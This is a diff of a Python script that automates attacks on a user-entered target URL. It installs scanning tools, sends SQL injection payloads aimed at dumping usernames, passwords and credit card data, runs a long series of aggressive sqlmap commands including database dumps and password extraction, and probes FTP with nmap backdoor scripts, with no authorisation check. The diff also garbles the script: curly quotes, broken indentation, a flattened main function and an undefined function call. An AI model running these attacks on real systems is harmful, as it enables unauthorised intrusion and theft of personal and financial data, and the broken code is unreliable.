@@ -33,7 +33,8 @@ def install_tools():
         "nmap": ["sudo", "apt-get", "install", "-y", "nmap"],
         "sqlmap": ["sudo", "apt-get", "install", "-y", "sqlmap"],
         "whois": ["sudo", "apt-get", "install", "-y", "whois"],
-        "subfinder": ["sudo", "apt-get", "install", "-y", "subfinder"]
+        "subfinder": ["sudo", "apt-get", "install", "-y", "subfinder"],
+        "seclists": ["sudo", "apt-get", "install", "-y", "seclists"]
     }
     
     for tool, install_command in tools.items():
@@ -91,6 +92,14 @@ def perform_sql_injection(target_url, results_dir):
     """Perform SQL Injection using the provided payloads."""
     global file_count  # Declare file_count as global
     payloads = [
+        "' OR 1=1 --",
+        "' OR '1'='1' --",
+        "' OR '1'='1'/*",
+        "' OR '1'='1'#",
+        "' OR 1=1 UNION SELECT 1,2,3 --",
+        "' OR 1=1 UNION SELECT NULL, NULL, NULL --",
+        "' OR 1=1 UNION SELECT username, password FROM users --",
+        "' OR 1=1 UNION SELECT table_name, column_name FROM information_schema.columns --",
         "' OR 1=1 UNION SELECT cc_number, cc_holder, cc_expiration FROM credit_cards --",
         "' OR 1=1 UNION SELECT email FROM users --",
         "' OR 1=1 UNION SELECT password FROM users --",
@@ -127,55 +136,65 @@ def perform_sql_injection(target_url, results_dir):
         except Exception as e:
             print(f"An error occurred during SQL Injection attempt: {e}")
 
-def perform_ftp_scan(target_url, results_dir):
-    """Perform an FTP scan on the target URL."""
-    global file_count  # Declare file_count as global
-    command = ["nmap", "-p", "21", "--script", "ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221", target_url]
-    
-    try:
-        stdout, stderr = run_command(command)
-        output_file = os.path.join(results_dir, f'ftp_scan_{file_count}.txt')
-        with open(output_file, 'w') as file:
-            file.write(stdout)
-        print(f"Saved FTP scan results to {output_file}")
-        file_count += 1
-    except Exception as e:
-        print(f"An error occurred during FTP scan: {e}")
-
 def perform_sqlmap_scan(target_url, results_dir):
     """Perform a SQLmap scan on the target URL."""
     global file_count  # Declare file_count as global
-    command = ["sqlmap", "-u", target_url, "--dbs", "--tables", "--columns"]
+    commands = [
+        ["sqlmap", "-u", target_url, "--dbs"],
+        ["sqlmap", "-u", target_url, "--tables"],
+        ["sqlmap", "-u", target_url, "--columns"],
+        ["sqlmap", "-u", target_url, "--dump"],
+        ["sqlmap", "-u", target_url, "--batch"],
+        ["sqlmap", "-u", target_url, "--level=5", "--risk=3"],
+        ["sqlmap", "-u", target_url, "--technique=U"],
+        ["sqlmap", "-u", target_url, "--technique=T"],
+        ["sqlmap", "-u", target_url, "--passwords"],
+        ["sqlmap", "-u", target_url, "--users"],
+        ["sqlmap", "-u", target_url, "--current-user"],
+        ["sqlmap", "-u", target_url, "--current-db"],
+        ["sqlmap", "-u", target_url, "--is-dba"],
+        ["sqlmap", "-u", target_url, "--roles"],
+        ["sqlmap", "-u", target_url, "--privileges"],
+        ["sqlmap", "-u", target_url, "--fingerprint"]
+    ]
     
+    for command in commands:
+        try:
+            stdout, stderr = run_command(command)
+            output_file = os.path.join(results_dir, f'sqlmap_scan_{file_count}.txt')
+            with open(output_file, 'w') as file:
+                file.write(stdout)
+            print(f"Saved SQLmap scan results to {output_file}")
+            file_count += 1
+        except Exception as e:
+            print(f"An error occurred during SQLmap scan: {e}")
+
+def perform_ftp_scan(target_url, results_dir):
+    """Perform an FTP scan on the target URL."""
+    global file_count  # Declare file_count as global
+    command = ["nmap", "-p", "21", "--script", "ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221”, target_url]
     try:
-        stdout, stderr = run_command(command)
-        output_file = os.path.join(results_dir, f'sqlmap_scan_{file_count}.txt')
-        with open(output_file, 'w') as file:
-            file.write(stdout)
-        print(f"Saved SQLmap scan results to {output_file}")
-        file_count += 1
-    except Exception as e:
-        print(f"An error occurred during SQLmap scan: {e}")
-
-def main():
-    clear_screen()
-    print_header()
-    install_tools()
-    
+    stdout, stderr = run_command(command)
+    output_file = os.path.join(results_dir, f'ftp_scan_{file_count}.txt')
+    with open(output_file, 'w') as file:
+        file.write(stdout)
+    print(f"Saved FTP scan results to {output_file}")
+    file_count += 1
+except Exception as e:
+    print(f"An error occurred during FTP scan: {e}")
     target_url = input("Enter the target URL: ")
-    results_dir = input("Enter the results directory: ")
-    
-    if check_website_status(target_url):
-        perform_sql_injection(target_url, results_dir)
-        perform_ftp_scan(target_url, results_dir)
-        perform_sqlmap_scan(target_url, results_dir)
-    else:
-        print("The website is not accessible. Exiting...")
+results_dir = input("Enter the results directory: ")
 
-    # Adding the link at the end of the script
-    link = "http://example.com/report"
-    with open("result_summary.txt", 'a') as file:
-        file.write(f"\nPlease refer to the following link for the detailed report: {link}\n")
+if not os.path.exists(results_dir):
+    os.makedirs(results_dir)
 
-if __name__ == "__main__":
-    main()
+if check_website_status(target_url):
+    perform_sql_injection(target_url, results_dir)
+    perform_ftp_scan(target_url, results_dir)
+    perform_sqlmap_scan(target_url, results_dir)
+    seclists_db = access_seclists()
+    print(seclists_db)
+else:
+    print("The website is not accessible. Exiting...")
+    if name == “main”:
+main()
